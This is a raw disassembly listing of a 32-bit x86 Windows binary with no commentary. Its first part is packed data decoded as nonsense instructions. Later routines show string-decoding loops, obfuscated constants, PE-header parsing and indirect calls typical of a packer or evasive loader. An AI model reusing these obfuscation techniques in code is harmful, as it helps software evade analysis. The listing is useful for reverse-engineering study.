  423c35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423c36:	or     ch,BYTE PTR [edi]
  423c38:	push   es
  423c39:	cmc    
  423c3a:	xor    al,0x55
  423c3c:	in     eax,0x75
  423c3e:	fwait
  423c3f:	(bad)  
  423c40:	jmp    0x261a9d1f
  423c45:	call   0x990d:0x75ad1071
  423c4c:	dec    esi
  423c4d:	ja     0x423c2a
  423c4f:	jo     0x423c77
  423c51:	ja     0x423c16
  423c53:	cdq    
  423c54:	fild   DWORD PTR [ecx-0x6400cb5f]
  423c5a:	ss hlt 
  423c5c:	dec    edi
  423c5d:	inc    eax
  423c5e:	mov    dl,0xb
  423c60:	fwait
  423c61:	enter  0x5222,0xeb
  423c65:	jne    0x423bee
  423c67:	and    eax,0xedd724a5
  423c6c:	int3   
  423c6d:	fistp  DWORD PTR [eax-0x21]
  423c70:	xor    bl,BYTE PTR [eax-0x77]
  423c73:	lods   al,BYTE PTR ds:[esi]
  423c74:	stc    
  423c75:	ja     0x423ca8
  423c77:	add    ecx,ecx
  423c79:	bound  ebp,QWORD PTR [edi-0x41ee42b]
  423c7f:	ret    0xf9fe
  423c82:	cmp    dl,BYTE PTR [esp+edx*4+0x1263666d]
  423c89:	daa    
  423c8a:	push   ss
  423c8b:	or     DWORD PTR [ecx+0x17507ae8],ebx
  423c91:	push   esp
  423c92:	and    bl,bl
  423c94:	shl    BYTE PTR ds:0x5980f2a5,1
  423c9a:	push   cs
  423c9b:	push   ebx
  423c9c:	xor    esp,DWORD PTR [eax]
  423c9e:	mov    ds,esi
  423ca0:	dec    ebp
  423ca1:	pop    esi
  423ca2:	loopne 0x423ced
  423ca4:	sub    al,bl
  423ca6:	mov    cl,0x26
  423ca8:	ja     0x423d27
  423caa:	pop    es
  423cab:	pop    ebx
  423cac:	sub    BYTE PTR ds:0xb7527f2e,al
  423cb2:	(bad)  
  423cb3:	pop    ebp
  423cb4:	fidiv  WORD PTR [edx-0x2e111f44]
  423cba:	mov    esp,0x6a16f036
  423cbf:	ret    
  423cc0:	and    esi,0x78af24e7
  423cc6:	xor    al,0x5e
  423cc8:	add    DWORD PTR [ebx+0x101ef758],edi
  423cce:	push   ecx
  423ccf:	jo     0x423cdb
  423cd1:	inc    eax
  423cd2:	cmp    eax,0xe585a555
  423cd7:	es pop ecx
  423cd9:	aam    0x18
  423cdb:	sub    BYTE PTR [esi-0x70],al
  423cde:	mov    edi,0xc093a26e
  423ce3:	cmc    
  423ce4:	mov    ds:0x88cb95e5,al
  423ce9:	add    DWORD PTR [edx+ebx*1-0x3a9b4a7b],edi
  423cf0:	jp     0x423d45
  423cf2:	nop
  423cf3:	jae    0x423cdb
  423cf5:	idiv   BYTE PTR [ebx+0x3a55f1f0]
  423cfb:	imul   esp,esi,0x2e
  423cfe:	scas   eax,DWORD PTR es:[edi]
  423cff:	cmp    eax,0x477eaa92
  423d04:	loope  0x423ca6
  423d06:	inc    esi
  423d07:	fs es loopne 0x423cd1
  423d0b:	repz cmp eax,0x307a5960
  423d11:	int3   
  423d12:	bound  eax,QWORD PTR [esi-0x29]
  423d15:	dec    edx
  423d16:	add    BYTE PTR [eax],bh
  423d18:	daa    
  423d19:	inc    ebp
  423d1a:	push   ebx
  423d1b:	mov    ecx,0x574c93f3
  423d20:	scas   eax,DWORD PTR es:[edi]
  423d21:	lahf   
  423d22:	xor    BYTE PTR [eax-0x3f],bh
  423d25:	lds    ecx,FWORD PTR ds:0x45cb8b6
  423d2b:	xor    al,0xfa
  423d2d:	pop    ebp
  423d2e:	inc    eax
  423d2f:	loope  0x423cf3
  423d31:	push   0x69
  423d33:	xchg   edx,eax
  423d34:	jle    0x423ce3
  423d36:	scas   al,BYTE PTR es:[edi]
  423d37:	shl    dh,cl
  423d39:	loop   0x423d85
  423d3b:	stos   BYTE PTR es:[edi],al
  423d3c:	inc    esi
  423d3d:	xor    BYTE PTR [edx+0x7d66b0bc],bh
  423d43:	popw   ds
  423d45:	xchg   ebp,eax
  423d46:	cmp    bl,dh
  423d48:	pushf  
  423d49:	inc    ebx
  423d4a:	es test al,0x71
  423d4d:	mov    esi,0x1c9f0fa6
  423d52:	xor    BYTE PTR [edi],ch
  423d54:	dec    ecx
  423d55:	sbb    al,0xc
  423d57:	out    0x94,eax
  423d59:	(bad)  
  423d5a:	loopne 0x423d11
  423d5c:	mov    eax,ds:0xe3a85e92
  423d61:	push   ss
  423d62:	inc    ecx
  423d63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423d64:	in     eax,dx
  423d65:	int3   
  423d66:	adc    BYTE PTR [esi-0xe],dl
  423d69:	test   DWORD PTR ds:0xf8a73e83,esi
  423d6f:	mov    dl,BYTE PTR [edx+0x4c2af23f]
  423d75:	dec    ebx
  423d76:	jbe    0x423dd3
  423d78:	int3   
  423d79:	aas    
  423d7a:	call   0xba0f09e5
  423d7f:	xchg   ebx,eax
  423d80:	sub    ah,BYTE PTR [ecx+0x629db9a3]
  423d86:	sub    al,0x41
  423d88:	jmp    0x423d54
  423d8a:	sbb    esi,DWORD PTR [ebp-0x2a]
  423d8d:	jl     0x423d29
  423d8f:	(bad)  
  423d91:	push   ebp
  423d92:	xchg   edi,eax
  423d93:	jne    0x423df0
  423d95:	dec    ebx
  423d96:	fcom   DWORD PTR [ebx]
  423d98:	mov    ebx,0x93d9f983
  423d9d:	jno    0x423d5e
  423d9f:	stos   DWORD PTR es:[edi],eax
  423da0:	pop    es
  423da1:	add    BYTE PTR [ecx+0x711de1be],ch
  423da7:	mov    BYTE PTR ds:[ecx],bh
  423daa:	jae    0x423d47
  423dac:	mov    ebx,0xc37f521a
  423db1:	clc    
  423db2:	pusha  
  423db3:	inc    ebx
  423db4:	or     dl,BYTE PTR [ebp+edx*4-0x66]
  423db8:	xor    esp,DWORD PTR [esi+0x17]
  423dbb:	xor    BYTE PTR [eax-0x77],0x9
  423dbf:	pop    es
  423dc0:	dec    esi
  423dc1:	dec    eax
  423dc2:	cmp    eax,DWORD PTR [edx+0x1a1c17d7]
  423dc8:	sbb    al,0xca
  423dca:	mov    cs,WORD PTR [edx+0x1ae60d1c]
  423dd0:	jp     0x423e0f
  423dd2:	dec    esp
  423dd3:	loop   0x423ded
  423dd5:	popf   
  423dd6:	mov    ecx,0xafb45a69
  423ddb:	mov    edi,0xa367a791
  423de0:	xchg   ecx,eax
  423de1:	mov    cl,0x54
  423de3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423de4:	dec    ecx
  423de5:	iret   
  423de6:	push   es
  423de7:	into   
  423de8:	shl    BYTE PTR [edi],cl
  423dea:	adc    bl,dh
  423dec:	imul   eax,esp,0x372f35d9
  423df2:	adc    BYTE PTR [eax+0x17476d59],cl
  423df8:	not    BYTE PTR [edi+0x728e25f6]
  423dfe:	sbb    BYTE PTR [ecx],0xe0
  423e01:	jecxz  0x423d8e
  423e03:	inc    ebp
  423e04:	or     BYTE PTR [edi],cl
  423e06:	mov    esi,0x72f6ba00
  423e0b:	xor    al,BYTE PTR [eax]
  423e0d:	sub    eax,edx
  423e0f:	mov    ecx,0x75108af
  423e14:	xor    eax,ecx
  423e16:	cmp    eax,0xf89c85f8
  423e1b:	mov    DWORD PTR ds:0x428e97,0x5a9f
  423e25:	jne    0x423e8a
  423e2b:	mov    eax,DWORD PTR [ebp+0x8]
  423e2e:	push   esi
  423e2f:	or     DWORD PTR ds:0x428e8b,edx
  423e35:	mov    esi,DWORD PTR [ebp+0x8]
  423e38:	add    esi,DWORD PTR [eax+0x3c]
  423e3b:	sbb    DWORD PTR ds:0x428e23,0x3013
  423e45:	mov    DWORD PTR [ebp+0x8],esi
  423e48:	sbb    DWORD PTR ds:0x428e6b,0x1c7d
  423e52:	mov    eax,DWORD PTR [ebp-0x4]
  423e55:	mov    esi,DWORD PTR ds:0x428e6b
  423e5b:	adc    esi,DWORD PTR ds:0x428e2f
  423e61:	mov    DWORD PTR ds:0x428e6b,esi
  423e67:	mov    esi,DWORD PTR [ebp+0x8]
  423e6a:	adc    DWORD PTR ds:0x428ecf,0x428ea3
  423e74:	xor    eax,ecx
  423e76:	add    eax,edx
  423e78:	cmp    DWORD PTR [esi+0x54],eax
  423e7b:	pop    esi
  423e7c:	je     0x423e8a
  423e82:	mov    eax,DWORD PTR [ebp+0x8]
  423e85:	jmp    0x423e91
  423e8a:	mov    eax,DWORD PTR [ebp-0x4]
  423e8d:	xor    eax,ecx
  423e8f:	add    eax,edx
  423e91:	leave  
  423e92:	ret    0x4
  423e95:	push   ebp
  423e96:	mov    ebp,esp
  423e98:	sub    esp,0xc
  423e9b:	push   esi
  423e9c:	or     DWORD PTR ds:0x428eaf,ebx
  423ea2:	mov    esi,0xf89c85a5
  423ea7:	and    DWORD PTR ds:0x428e97,0x0
  423eb1:	jmp    0x423ec3
  423eb6:	mov    edx,DWORD PTR ds:0x428e97
  423ebc:	inc    edx
  423ebd:	mov    DWORD PTR ds:0x428e97,edx
  423ec3:	cmp    DWORD PTR ds:0x428e97,0x10
  423eca:	jae    0x423f0a
  423ed0:	cmp    DWORD PTR ds:0x428e97,0x8
  423ed7:	jg     0x423f0a
  423edd:	jmp    0x423eeb
  423ee2:	push   DWORD PTR [ebp-0x20]
  423ee5:	call   DWORD PTR ds:0x42aa3b
  423eeb:	cmp    DWORD PTR ds:0x428e97,0x7
  423ef2:	jne    0x423f05
  423ef8:	mov    edx,DWORD PTR ds:0x428e97
  423efe:	inc    edx
  423eff:	mov    DWORD PTR ds:0x428e97,edx
  423f05:	jmp    0x423eb6
  423f0a:	mov    DWORD PTR [ebp-0x8],esi
  423f0d:	and    DWORD PTR ds:0x428e67,0x0
  423f17:	jmp    0x423f29
  423f1c:	mov    edx,DWORD PTR ds:0x428e67
  423f22:	inc    edx
  423f23:	mov    DWORD PTR ds:0x428e67,edx
  423f29:	cmp    DWORD PTR ds:0x428e67,0x1a
  423f30:	jae    0x423f78
  423f36:	cmp    DWORD PTR ds:0x428e67,0x4
  423f3d:	jle    0x423f78
  423f43:	jmp    0x423f59
  423f48:	push   DWORD PTR [ebp-0x18]
  423f4b:	push   0x428e67
  423f50:	push   DWORD PTR [ebp-0x18]
  423f53:	call   DWORD PTR ds:0x42aa3f
  423f59:	cmp    DWORD PTR ds:0x428e67,0x3
  423f60:	jne    0x423f73
  423f66:	mov    edx,DWORD PTR ds:0x428e67
  423f6c:	inc    edx
  423f6d:	mov    DWORD PTR ds:0x428e67,edx
  423f73:	jmp    0x423f1c
  423f78:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  423f7f:	push   edi
  423f80:	adc    DWORD PTR ds:0x428e87,0x34d1
  423f8a:	mov    eax,eax
  423f8c:	mov    eax,DWORD PTR [ebp-0x4]
  423f8f:	movzx  edx,BYTE PTR ds:0x428e97
  423f96:	add    DWORD PTR ds:0x428ecf,edx
  423f9c:	mov    edi,DWORD PTR [ebp-0x8]
  423f9f:	mov    ecx,DWORD PTR ds:0x429747
  423fa5:	mov    ecx,DWORD PTR [ecx]
  423fa7:	sub    DWORD PTR ds:0x428ecb,ecx
  423fad:	mov    ecx,0x75108af
  423fb2:	xor    eax,ecx
  423fb4:	xor    edi,ecx
  423fb6:	mov    edx,0x3272f6
  423fbb:	add    edi,edx
  423fbd:	add    eax,edx
  423fbf:	imul   eax,edi
  423fc2:	mov    edi,DWORD PTR [ebp+0xc]
  423fc5:	cmp    edi,eax
  423fc7:	je     0x42401c
  423fcd:	mov    DWORD PTR [ebp-0xc],esi
  423fd0:	mov    eax,DWORD PTR [ebp-0xc]
  423fd3:	mov    esi,DWORD PTR [ebp+0xc]
  423fd6:	xor    eax,ecx
  423fd8:	lea    eax,[eax*8+0x1939828]
  423fdf:	mov    eax,DWORD PTR [esi+eax*1]
  423fe2:	mov    DWORD PTR [ebp+0xc],eax
  423fe5:	mov    eax,DWORD PTR [ebp-0x4]
  423fe8:	mov    esi,DWORD PTR [ebp-0x8]
  423feb:	xor    eax,ecx
  423fed:	xor    esi,ecx
  423fef:	add    esi,edx
  423ff1:	add    eax,edx
  423ff3:	imul   eax,esi
  423ff6:	mov    esi,DWORD PTR [ebp+0xc]
  423ff9:	cmp    esi,eax
  423ffb:	je     0x42401c
  424001:	mov    eax,DWORD PTR [ebp-0x4]
  424004:	xor    eax,ecx
  424006:	mov    ecx,DWORD PTR [ebp+0xc]
  424009:	add    eax,edx
  42400b:	imul   eax,ecx
  42400e:	add    eax,DWORD PTR [ebp+0x8]
  424011:	mov    DWORD PTR [ebp+0xc],eax
  424014:	mov    eax,DWORD PTR [ebp+0xc]
  424017:	jmp    0x42402d
  42401c:	mov    eax,DWORD PTR [ebp-0x4]
  42401f:	mov    esi,DWORD PTR [ebp-0x8]
  424022:	xor    esi,ecx
  424024:	xor    eax,ecx
  424026:	add    esi,edx
  424028:	add    eax,edx
  42402a:	imul   eax,esi
  42402d:	pop    edi
  42402e:	pop    esi
  42402f:	leave  
  424030:	ret    0x8
	...
  424043:	add    BYTE PTR [ebp-0x44],al
  424046:	mov    edi,0x4d
  42404b:	add    BYTE PTR [edx],al
  42404d:	add    BYTE PTR [eax],al
  42404f:	add    BYTE PTR [ecx+0x0],al
  424052:	add    BYTE PTR [eax],al
  424054:	pusha  
  424055:	inc    eax
  424056:	add    al,BYTE PTR [eax]
  424058:	pusha  
  424059:	xor    al,0x2
  42405b:	add    BYTE PTR [eax],al
  42405d:	add    BYTE PTR [eax],al
  42405f:	add    BYTE PTR [edx+0x53],dl
  424062:	inc    esp
  424063:	push   ebx
  424064:	mov    edx,0x6c08d2ab
  424069:	in     al,dx
  42406a:	adc    al,0x4b
  42406c:	add    DWORD PTR [edi],0x5882f3fd
  424072:	pop    ds
  424073:	sbb    al,0x1
  424075:	add    BYTE PTR [eax],al
  424077:	add    BYTE PTR [ebx+0x3a],al
  42407a:	pop    esp
  42407b:	inc    esi
  42407c:	outs   dx,DWORD PTR ds:[esi]
  42407d:	ins    BYTE PTR es:[edi],dx
  42407e:	fs gs jb 0x4240a2
  424082:	outs   dx,DWORD PTR ds:[esi]
  424083:	data16 and BYTE PTR [edi+0x6f],dl
  424087:	jb     0x4240f4
  424089:	imul   ebp,DWORD PTR [esi+0x67],0x6f725020
  424090:	push   0x65
  424092:	arpl   WORD PTR [esp+ebx*2+0x50],si
  424096:	jb     0x424107
  424098:	push   0x65
  42409a:	arpl   WORD PTR [esp+edx*2+0x65],si
  42409e:	jae    0x424114
  4240a0:	add    BYTE PTR [ebx-0x137e13ab],cl
  4240a6:	or     BYTE PTR [ecx],al
  4240a8:	add    BYTE PTR [eax],al
  4240aa:	push   ebx
  4240ab:	mov    eax,ebx
  4240ad:	xchg   ecx,eax
  4240ae:	mov    eax,DWORD PTR [ebp+0x8]
  4240b1:	cmp    eax,0xf89c85a5
  4240b6:	jne    0x424542
  4240bc:	mov    eax,DWORD PTR [ebp+0xc]
  4240bf:	cmp    eax,0xf89c85a4
  4240c4:	jne    0x424542
  4240ca:	mov    eax,DWORD PTR [ebp+0x24]
  4240cd:	mov    DWORD PTR [ebp-0x4],eax
  4240d0:	mov    eax,DWORD PTR [ebp-0x4]
  4240d3:	mov    eax,DWORD PTR [eax+0x1d8]
  4240d9:	mov    eax,DWORD PTR [eax]
  4240db:	mov    eax,DWORD PTR [eax]
  4240dd:	mov    DWORD PTR [ebp-0x8],eax
  4240e0:	mov    BYTE PTR [ebp-0x18],0x1c
  4240e4:	mov    BYTE PTR [ebp-0x17],0x1f
  4240e8:	mov    BYTE PTR [ebp-0x16],0x1a
  4240ec:	mov    BYTE PTR [ebp-0x15],0x50
  4240f0:	mov    BYTE PTR [ebp-0x14],0x51
  4240f4:	mov    BYTE PTR [ebp-0x13],0x83
  4240f8:	mov    BYTE PTR [ebp-0x20],0xe
  4240fc:	mov    BYTE PTR [ebp-0x1f],0x10
  424100:	mov    BYTE PTR [ebp-0x1e],0x1e
  424104:	mov    BYTE PTR [ebp-0x1d],0x11
  424108:	mov    BYTE PTR [ebp-0x1c],0x50
  42410c:	mov    BYTE PTR [ebp-0x1b],0x51
  424110:	mov    BYTE PTR [ebp-0x1a],0x83
  424114:	mov    BYTE PTR [ebp-0x28],0x10
  424118:	mov    BYTE PTR [ebp-0x27],0x1b
  42411c:	mov    BYTE PTR [ebp-0x26],0x17
  424120:	mov    BYTE PTR [ebp-0x25],0xc
  424124:	mov    BYTE PTR [ebp-0x24],0x22
  424128:	mov    BYTE PTR [ebp-0x23],0x13
  42412c:	mov    BYTE PTR [ebp-0x22],0x1a
  424130:	mov    BYTE PTR [ebp-0x21],0x83
  424134:	xor    ecx,ecx
  424136:	lea    eax,[ebp+ecx*1-0x18]
  42413a:	movzx  edx,BYTE PTR [eax]
  42413d:	xor    edx,0x7f
  424140:	add    edx,0x4
  424143:	inc    ecx
  424144:	mov    BYTE PTR [eax],dl
  424146:	cmp    ecx,0x6
  424149:	jb     0x424136
  42414b:	xor    ecx,ecx
  42414d:	lea    eax,[ebp+ecx*1-0x20]
  424151:	movzx  edx,BYTE PTR [eax]
  424154:	xor    edx,0x7f
  424157:	add    edx,0x4
  42415a:	inc    ecx
  42415b:	mov    BYTE PTR [eax],dl
  42415d:	cmp    ecx,0x7
  424160:	jb     0x42414d
  424162:	xor    ecx,ecx
  424164:	lea    eax,[ebp+ecx*1-0x28]
  424168:	movzx  edx,BYTE PTR [eax]
  42416b:	xor    edx,0x7f
  42416e:	add    edx,0x4
  424171:	inc    ecx
  424172:	mov    BYTE PTR [eax],dl
  424174:	cmp    ecx,0x8
  424177:	jb     0x424164
  424179:	lea    eax,[ebp-0x2c]
  42417c:	mov    DWORD PTR [ebp-0x8],eax
  42417f:	mov    ecx,DWORD PTR [ebp-0x8]
  424182:	mov    eax,0x7113fccf
  424187:	push   esi
  424188:	mov    DWORD PTR [ecx],eax
  42418a:	mov    ecx,DWORD PTR [ebp-0x2c]
  42418d:	mov    esi,0x4e38
  424192:	push   edi
  424193:	lea    edi,[esi-0x6]
  424196:	mov    ebx,0x3272f6
  42419b:	cmp    ecx,eax
  42419d:	jne    0x42426e
  4241a3:	lea    eax,[esi+0x3f]
  4241a6:	mov    WORD PTR [ebp-0x78],ax
  4241aa:	mov    eax,esi
  4241ac:	mov    WORD PTR [ebp-0x76],ax
  4241b0:	add    eax,0x45
  4241b3:	mov    WORD PTR [ebp-0x74],ax
  4241b7:	lea    eax,[esi+0x6]
  4241ba:	mov    WORD PTR [ebp-0x72],ax
  4241be:	add    eax,0x41
  4241c1:	mov    WORD PTR [ebp-0x70],ax
  4241c5:	mov    eax,edi
  4241c7:	mov    WORD PTR [ebp-0x6e],ax
  4241cb:	mov    eax,0x4f94
  4241d0:	mov    WORD PTR [ebp-0x6c],ax
  4241d4:	lea    eax,[esi-0x7]
  4241d7:	mov    WORD PTR [ebp-0x6a],ax
  4241db:	add    eax,0x30
  4241de:	mov    WORD PTR [ebp-0x68],ax
  4241e2:	lea    eax,[esi-0x3]
  4241e5:	mov    WORD PTR [ebp-0x66],ax
  4241e9:	mov    eax,esi
  4241eb:	mov    WORD PTR [ebp-0x64],ax
  4241ef:	add    eax,0xfffffffc
  4241f2:	mov    WORD PTR [ebp-0x62],ax
  4241f6:	mov    eax,0x443
  4241fb:	mov    WORD PTR [ebp-0x60],ax
  4241ff:	mov    eax,0x5672
  424204:	mov    WORD PTR [ebp-0x5e],ax
  424208:	mov    eax,0x6112
  42420d:	mov    WORD PTR [ebp-0x5c],ax
  424211:	mov    eax,0xf1e0
  424216:	mov    WORD PTR [ebp-0x5a],ax
  42421a:	mov    eax,edi
  42421c:	mov    WORD PTR [ebp-0x58],ax
  424220:	lea    eax,[ebp-0xe0]
  424226:	push   eax
  424227:	mov    eax,DWORD PTR [ebp+0xc]
  42422a:	xor    eax,0x75108af
  42422f:	add    eax,ebx
  424231:	push   eax
  424232:	lea    eax,[ebp-0x78]
  424235:	push   eax
  424236:	mov    eax,DWORD PTR [ebp-0x4]
  424239:	mov    eax,DWORD PTR [eax+0x198]
  42423f:	mov    DWORD PTR [ebp-0xe0],0x1
  424249:	mov    DWORD PTR [ebp-0xdc],0xffff
  424253:	push   DWORD PTR [eax]
  424255:	mov    eax,DWORD PTR [ebp+0x10]
  424258:	call   eax
  42425a:	mov    DWORD PTR [ebp-0x8],eax
  42425d:	mov    eax,DWORD PTR [ebp-0x8]
  424260:	test   eax,eax
  424262:	je     0x42426e
  424264:	xor    DWORD PTR ds:0xe041cc1,0x9f170bd0
  42426e:	mov    eax,DWORD PTR [ebp-0x4]
  424271:	mov    ecx,DWORD PTR [eax+0x18c]
  424277:	xor    eax,eax
  424279:	cmp    DWORD PTR [ecx],eax
  42427b:	jne    0x4244b2
  424281:	mov    ecx,DWORD PTR [ebp-0x4]
  424284:	mov    ecx,DWORD PTR [ecx+0x17c]
  42428a:	mov    DWORD PTR [ecx],eax
  42428c:	mov    ecx,DWORD PTR [ebp-0x4]
  42428f:	mov    ecx,DWORD PTR [ecx+0x180]
  424295:	mov    DWORD PTR [ecx],eax
  424297:	mov    eax,0x4e6d
  42429c:	mov    WORD PTR [ebp-0x9c],ax
  4242a3:	mov    eax,esi
  4242a5:	mov    WORD PTR [ebp-0x9a],ax
  4242ac:	mov    eax,0x4e7d
  4242b1:	mov    WORD PTR [ebp-0x98],ax
  4242b8:	add    eax,0xffffffc0
  4242bb:	mov    WORD PTR [ebp-0x96],ax
  4242c2:	mov    eax,0x4f88
  4242c7:	mov    WORD PTR [ebp-0x94],ax
  4242ce:	mov    eax,0x4e3c
  4242d3:	mov    WORD PTR [ebp-0x92],ax
  4242da:	mov    eax,esi
  4242dc:	mov    WORD PTR [ebp-0x8c],ax
  4242e3:	mov    eax,0x4e31
  4242e8:	mov    WORD PTR [ebp-0x8a],ax
  4242ef:	mov    eax,0x99fd
  4242f4:	mov    WORD PTR [ebp-0x88],ax
  4242fb:	mov    eax,0x8d6c
  424300:	mov    WORD PTR [ebp-0x86],ax
  424307:	mov    eax,0xd66f
  42430c:	mov    WORD PTR [ebp-0x84],ax
  424313:	mov    BYTE PTR [ebp-0x10],0x10
  424317:	mov    eax,0xd783
  42431c:	mov    WORD PTR [ebp-0x82],ax
  424323:	mov    BYTE PTR [ebp-0xf],0x1b
  424327:	mov    eax,0x2782
  42432c:	mov    BYTE PTR [ebp-0xe],0x17
  424330:	mov    WORD PTR [ebp-0x80],ax
  424334:	mov    BYTE PTR [ebp-0xd],0xc
  424338:	mov    eax,0x4782
  42433d:	mov    BYTE PTR [ebp-0xc],0x22
  424341:	mov    WORD PTR [ebp-0x7e],ax
  424345:	mov    eax,0x4e33
  42434a:	mov    BYTE PTR [ebp-0xb],0x13
  42434e:	push   0x8
  424350:	mov    BYTE PTR [ebp-0xa],0x1a
  424354:	mov    WORD PTR [ebp-0x7c],ax
  424358:	mov    BYTE PTR [ebp-0x9],0x83
  42435c:	mov    DWORD PTR [ebp-0x90],0x4e324e61
  424366:	lea    eax,[ebp-0x10]
  424369:	pop    edi
  42436a:	movzx  ecx,BYTE PTR [eax]
  42436d:	xor    ecx,0x7f
  424370:	add    ecx,0x4
  424373:	mov    BYTE PTR [eax],cl
  424375:	inc    eax
  424376:	dec    edi
  424377:	jne    0x42436a
  424379:	mov    DWORD PTR [ebp-0xe0],0x1
  424383:	lea    eax,[ebp-0x10]
  424386:	mov    DWORD PTR [ebp-0xdc],eax
  42438c:	mov    ecx,0x4e60
  424391:	mov    eax,ecx
  424393:	mov    WORD PTR [ebp-0x40],ax
  424397:	add    eax,0xb
  42439a:	mov    edx,eax
  42439c:	mov    WORD PTR [ebp-0x3e],dx
  4243a0:	mov    edx,0x4f93
  4243a5:	mov    WORD PTR [ebp-0x3c],dx
  4243a9:	add    edx,0xfffffff8
  4243ac:	mov    WORD PTR [ebp-0x3a],dx
  4243b0:	mov    edx,0x4f89
  4243b5:	mov    WORD PTR [ebp-0x38],dx
  4243b9:	add    edx,0x5
  4243bc:	mov    WORD PTR [ebp-0x36],dx
  4243c0:	mov    edx,0x4f87
  4243c5:	mov    WORD PTR [ebp-0x34],dx
  4243c9:	mov    WORD PTR [ebp-0x32],cx
  4243cd:	mov    ecx,esi
  4243cf:	mov    WORD PTR [ebp-0x30],cx
  4243d3:	lea    ecx,[edx-0x7]
  4243d6:	mov    edx,ecx
  4243d8:	mov    WORD PTR [ebp-0x54],dx
  4243dc:	mov    edx,eax
  4243de:	mov    WORD PTR [ebp-0x52],dx
  4243e2:	mov    edx,0x4e73
  4243e7:	mov    WORD PTR [ebp-0x50],dx
  4243eb:	mov    WORD PTR [ebp-0x4e],ax
  4243ef:	lea    eax,[edx-0xa]
  4243f2:	mov    WORD PTR [ebp-0x4c],ax
  4243f6:	add    eax,0x5
  4243f9:	mov    WORD PTR [ebp-0x4a],ax
  4243fd:	lea    eax,[edx-0xc]
  424400:	mov    WORD PTR [ebp-0x48],ax
  424404:	mov    WORD PTR [ebp-0x46],cx
  424408:	mov    WORD PTR [ebp-0x44],si
  42440c:	mov    ecx,DWORD PTR [ebp+0x8]
  42440f:	movzx  edx,WORD PTR [ebp-0x54]
  424413:	mov    eax,0x75108af
  424418:	xor    ecx,eax
  42441a:	add    ecx,ebx
  42441c:	xor    ecx,edx
  42441e:	mov    WORD PTR [ebp-0x54],cx
  424422:	mov    ecx,DWORD PTR [ebp+0x8]
  424425:	xor    ecx,eax
  424427:	movzx  eax,WORD PTR [ebp-0x40]
  42442b:	add    ecx,ebx
  42442d:	xor    ecx,eax
  42442f:	xor    eax,eax
  424431:	mov    WORD PTR [ebp-0x40],cx
  424435:	mov    WORD PTR [ebp-0xf4],ax
  42443c:	mov    WORD PTR [ebp-0x108],ax
  424443:	mov    edi,DWORD PTR [ebp+0x24]
  424446:	lea    eax,[ebp-0xf4]
  42444c:	lea    edx,[ebp-0x54]
  42444f:	mov    DWORD PTR [ebp-0xe0],0x2
  424459:	mov    DWORD PTR [ebp-0xdc],eax
  42445f:	call   0x426ea1
  424464:	mov    ecx,DWORD PTR [ebp+0x8]
  424467:	mov    DWORD PTR [ebp-0xd8],eax
  42446d:	mov    eax,0x75108af
  424472:	xor    ecx,eax
  424474:	add    ecx,ebx
  424476:	je     0x424495
  424478:	lea    ecx,[ebp-0xe0]
  42447e:	push   ecx
  42447f:	mov    ecx,DWORD PTR [ebp+0xc]
  424482:	xor    ecx,eax
  424484:	add    ecx,ebx
  424486:	push   ecx
  424487:	lea    eax,[ebp-0x9c]
  42448d:	push   eax
  42448e:	mov    eax,DWORD PTR [ebp+0x10]
  424491:	push   0x0
  424493:	call   eax
  424495:	mov    edi,DWORD PTR [ebp+0x24]
  424498:	lea    eax,[ebp-0x108]
  42449e:	lea    edx,[ebp-0x40]
  4244a1:	mov    DWORD PTR [ebp-0xdc],eax
  4244a7:	call   0x426ea1
  4244ac:	mov    DWORD PTR [ebp-0xd8],eax
  4244b2:	mov    eax,DWORD PTR [ebp+0x14]
  4244b5:	push   DWORD PTR [ebp-0x4]
  4244b8:	push   DWORD PTR [ebp+0x20]
  4244bb:	push   DWORD PTR [ebp+0x1c]
  4244be:	push   DWORD PTR [ebp+0x18]
  4244c1:	push   DWORD PTR [ebp+0x10]
  4244c4:	push   DWORD PTR [ebp+0x8]
  4244c7:	push   DWORD PTR [ebp+0xc]
  4244ca:	call   0x425742
  4244cf:	test   eax,eax
  4244d1:	je     0x424518
  4244d3:	add    DWORD PTR [ebp-0x4],eax
  4244d6:	push   DWORD PTR [ebp-0x4]
  4244d9:	lea    esi,[ebp+0x4]
  4244dc:	call   0x424930
  4244e1:	mov    eax,DWORD PTR [ebp-0x4]
  4244e4:	mov    eax,DWORD PTR [eax+0x1c8]
  4244ea:	mov    eax,DWORD PTR [eax]
  4244ec:	xor    eax,0x75108af
  4244f1:	add    eax,ebx
  4244f3:	mov    eax,DWORD PTR [ebp-0x4]
  4244f6:	jne    0x42450e
  4244f8:	mov    ecx,DWORD PTR [ebp-0x4]
  4244fb:	mov    ecx,DWORD PTR [ecx+0x1cc]
  424501:	push   DWORD PTR [ecx]
  424503:	mov    eax,DWORD PTR [eax+0x1e0]
  424509:	call   DWORD PTR [eax+0x28]
  42450c:	jmp    0x424518
  42450e:	mov    eax,DWORD PTR [eax+0x17c]
  424514:	mov    eax,DWORD PTR [eax]
  424516:	add    DWORD PTR [esi],eax
  424518:	mov    eax,DWORD PTR [ebp-0x4]
  42451b:	mov    eax,DWORD PTR [eax+0x1dc]
  424521:	dec    DWORD PTR [eax]
  424523:	mov    ecx,DWORD PTR [ebp-0x4]
  424526:	mov    ecx,DWORD PTR [ecx+0x1d8]
  42452c:	mov    eax,DWORD PTR [eax]
  42452e:	lea    eax,[ecx+eax*4]
  424531:	mov    ecx,DWORD PTR [ebp-0x4]
  424534:	mov    ecx,DWORD PTR [ecx+0x17c]
  42453a:	mov    eax,DWORD PTR [eax]
  42453c:	mov    ecx,DWORD PTR [ecx]
  42453e:	add    DWORD PTR [eax],ecx
  424540:	pop    edi
  424541:	pop    esi
  424542:	pop    ebx
  424543:	leave  
  424544:	ret    0x20
  424547:	push   edi
  424548:	push   esi
  424549:	push   ebx
  42454a:	push   ebp
  42454b:	mov    ebp,esp
  42454d:	mov    eax,DWORD PTR [ebp+0x24]
  424550:	add    DWORD PTR [ebp+0x28],eax
  424553:	push   eax
  424554:	cld    
  424555:	mov    esi,DWORD PTR [ebp+0x18]
  424558:	add    DWORD PTR [ebp+0x1c],esi
  42455b:	push   esi
  42455c:	mov    esi,DWORD PTR [ebp+0x14]
  42455f:	lods   eax,DWORD PTR ds:[esi]
  424560:	xchg   edx,eax
  424561:	push   edx
  424562:	mov    cl,BYTE PTR [esi-0x2]
  424565:	or     eax,0xffffffff
  424568:	shl    eax,cl
  42456a:	not    eax
